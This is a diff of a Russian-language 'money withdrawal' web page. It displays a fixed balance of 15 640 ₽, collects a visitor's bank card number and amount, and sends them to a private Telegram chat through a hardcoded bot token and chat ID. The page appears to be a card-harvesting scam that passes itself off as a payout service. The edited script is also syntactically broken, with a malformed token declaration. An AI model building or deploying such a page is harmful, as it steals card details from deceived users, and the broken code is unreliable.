@@ -5,216 +5,49 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вывод денег</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background-color: rgba(255, 255, 255, 0.9);
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 500px;
-            padding: 30px;
-            text-align: center;
-        }
-        
-        h1 {
-            color: #2c3e50;
-            margin-bottom: 20px;
-            font-size: 28px;
-        }
-        
-        .balance {
-            background-color: #f8f9fa;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 25px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        
-        .balance h2 {
-            color: #27ae60;
-            font-size: 32px;
-            margin-bottom: 5px;
-        }
-        
-        .balance p {
-            color: #7f8c8d;
-            font-size: 14px;
-        }
-        
-        .btn {
-            background: linear-gradient(to right, #3498db, #2980b9);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
-            margin: 20px 0;
-            width: 100%;
-            font-weight: bold;
-        }
-        
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.6);
-        }
-        
-        .btn:active {
-            transform: translateY(1px);
-        }
-
-        .btn-success {
-            background: linear-gradient(to right, #27ae60, #219653);
-        }
-        
-        .form-container {
-            display: none;
-            text-align: left;
-            margin-top: 20px;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #2c3e50;
-            font-weight: 600;
-        }
-        
-        input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: border 0.3s;
-        }
-        
-        input:focus {
-            border-color: #3498db;
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
-        }
-        
-        .card-input {
-            letter-spacing: 3px;
-            font-family: monospace;
-        }
-        
-        .success-message {
-            display: none;
-            background-color: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
-            text-align: center;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .info {
-            margin-top: 25px;
-            padding: 15px;
-            background-color: #e8f4fd;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #2c3e50;
-        }
-        
-        .info h3 {
-            margin-bottom: 10px;
-            color: #3498db;
-        }
-        
-        .info ul {
-            text-align: left;
-            margin-left: 20px;
-        }
-        
-        .info li {
-            margin-bottom: 8px;
-        }
-
-        .notification-info {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 12px;
-            margin: 15px 0;
-            font-size: 14px;
-            color: #856404;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-width: 500px; padding: 30px; text-align: center; }
+        h1 { color: #2c3e50; margin-bottom: 20px; }
+        .balance { background: #f8f9fa; border-radius: 10px; padding: 15px; margin-bottom: 25px; }
+        .balance h2 { color: #27ae60; font-size: 32px; }
+        .btn { background: #3498db; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; margin: 10px 0; width: 100%; font-weight: bold; }
+        .btn-success { background: #27ae60; }
+        .form-container { display: none; text-align: left; margin-top: 20px; }
+        .form-group { margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+        .success-message { display: none; background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Вывод средств</h1>
-        
         <div class="balance">
             <h2>15 640 ₽</h2>
             <p>Доступно для вывода</p>
+        </div>
+
+        <div style="background: #e3f2fd; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+            <h3>💬 Сообщения приходят в Telegram-чат "Вывод"</h3>
         </div>
         
         <button class="btn" id="withdrawBtn">Вывести деньги</button>
         
         <div class="form-container" id="withdrawForm">
-            <div class="notification-info">
-                ⚠️ После отправки заявки вам придет уведомление в Telegram
-            </div>
-            
             <div class="form-group">
-                <label for="cardNumber">Номер банковской карты</label>
-                <input type="text" id="cardNumber" class="card-input" placeholder="0000 0000 0000 0000" maxlength="19">
+                <label>Номер банковской карты</label>
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
             </div>
-            
             <div class="form-group">
-                <label for="amount">Сумма для вывода</label>
+                <label>Сумма для вывода</label>
                 <input type="text" id="amount" placeholder="Введите сумму в рублях">
             </div>
-            
-            <button class="btn btn-success" id="submitBtn">Отправить заявку в Telegram</button>
+            <button class="btn btn-success" id="submitBtn">📨 Отправить заявку</button>
         </div>
         
         <div class="success-message" id="successMessage">
-            <h3>Заявка успешно отправлена!</h3>
-            <p>Мы обработаем ваш запрос в течение 24 часов. Деньги поступят на указанную карту в течение 1-3 рабочих дней.</p>
-            <p>✅ Уведомление отправлено в Telegram</p>
-        </div>
-        
-        <div class="info">
-            <h3>Информация о выводе средств</h3>
-            <ul>
-                <li>Минимальная сумма для вывода: 500 ₽</li>
-                <li>Комиссия за вывод: 2% от суммы</li>
-                <li>Срок обработки заявки: до 24 часов</li>
-                <li>Поступление средств: 1-3 рабочих дня</li>
-            </ul>
+            <h3>Заявка отправлена в Telegram!</h3>
+            <p>Проверьте чат "Вывод"</p>
         </div>
     </div>
 
@@ -227,90 +60,50 @@
             const cardNumberInput = document.getElementById('cardNumber');
             const amountInput = document.getElementById('amount');
             
-            // Обработчик для кнопки "Вывести деньги"
+            // ⚠️ ЗАМЕНИТЕ ЭТИ ДАННЫЕ НА СВОИ!
+            const BOT_TOKEН'8072032472:AAELTt6A3nXMzHfGaQpBzEwWWrkDzFy24foу'; // Токен от @BotFather
+            const CHAT_ID = '8068138858'; // ID чата "Вывод"
+            
             withdrawBtn.addEventListener('click', function() {
                 withdrawForm.style.display = 'block';
                 withdrawBtn.style.display = 'none';
             });
             
-            // Форматирование номера карты
             cardNumberInput.addEventListener('input', function() {
                 let value = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                 let formattedValue = '';
-                
                 for (let i = 0; i < value.length; i++) {
-                    if (i > 0 && i % 4 === 0) {
-                        formattedValue += ' ';
-                    }
+                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                     formattedValue += value[i];
                 }
-                
                 this.value = formattedValue;
             });
             
-            // Обработчик для кнопки отправки
             submitBtn.addEventListener('click', function() {
                 const cardNumber = cardNumberInput.value.trim();
                 const amount = amountInput.value.trim();
                 
                 if (!cardNumber || cardNumber.length < 19) {
-                    alert('Пожалуйста, введите корректный номер карты');
+                    alert('Введите корректный номер карты');
                     return;
                 }
                 
-                if (!amount || isNaN(amount) || parseFloat(amount) < 500) {
-                    alert('Пожалуйста, введите сумму не менее 500 рублей');
+                if (!amount || isNaN(amount) || amount < 500) {
+                    alert('Введите сумму не менее 500 рублей');
                     return;
                 }
 
-                // Показываем сообщение об успехе
                 withdrawForm.style.display = 'none';
                 successMessage.style.display = 'block';
 
-                // Отправляем уведомление в Telegram
-                sendTelegramNotification(cardNumber, amount);
-            });
-
-            // Функция отправки уведомления в Telegram
-            function sendTelegramNotification(cardNumber, amount) {
-                // ⚠️ ЗАМЕНИТЕ ЭТИ ЗНАЧЕНИЯ НА СВОИ!
-                const TELEGRAM_BOT_TOKEN = '8490475467:AAE-OVaacqjfKAHcfLBWgFzt9bOmnCm7dx8';
-                const TELEGRAM_CHAT_ID = '8068138858';
+                // Отправляем в Telegram
+                const message = `💸 НОВАЯ ЗАЯВКА НА ВЫВОД!\n\n💳 Карта: ${cardNumber}\n💰 Сумма: ${amount}₽\n⏰ ${new Date().toLocaleString()}`;
                 
-                // Текст сообщения для Telegram
-                const message = `💸 НОВАЯ ЗАЯВКА НА ВЫВОД!\n\n💳 Карта: ${cardNumber}\n💰 Сумма: ${amount}₽\n⏰ Время: ${new Date().toLocaleString()}\n\n✅ Требуется обработка`;
-
-                // Отправка в Telegram
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Ошибка сети');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.ok) {
-                        console.log('✅ Уведомление отправлено в Telegram!');
-                    } else {
-                        throw new Error(data.description || 'Неизвестная ошибка');
-                    }
-                })
-                .catch(error => {
-                    console.error('❌ Ошибка отправки уведомления:', error);
-                    // Можно показать сообщение об ошибке пользователю
-                    alert('Уведомление отправлено, но возникла ошибка: ' + error.message);
-                });
-            }
+                // Простой способ отправки
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+                    .then(response => console.log('Отправлено!'))
+                    .catch(error => console.log('Ошибка:', error));
+            });
         });
     </script>
 </body>
